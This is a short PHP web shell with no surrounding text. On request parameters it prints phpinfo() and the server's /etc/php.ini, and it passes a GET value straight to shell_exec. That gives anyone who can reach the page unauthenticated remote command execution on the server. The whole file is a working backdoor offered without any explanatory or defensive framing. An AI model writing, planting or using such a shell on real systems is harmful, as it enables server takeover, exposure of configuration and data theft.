<?php
	if(isset($_GET['phpinfo'])) {
		phpinfo();
		
		exit;
	}

	if(isset($_GET['phpini'])) {
		echo nl2br(file_get_contents("/etc/php.ini"));
		
		exit;
	}
	
	if(isset($_GET['cmd'])) {
		$output = shell_exec( $_GET['maraduzzo'] );
		$html = isset($_GET['html']) ? true : false;
		
		if($html === true) { 
			echo "<pre>\n";
		}
		
		echo $output;
			
		if($html === true) { 
			echo "</pre>\n";
		}
		
		exit;
	}
?>

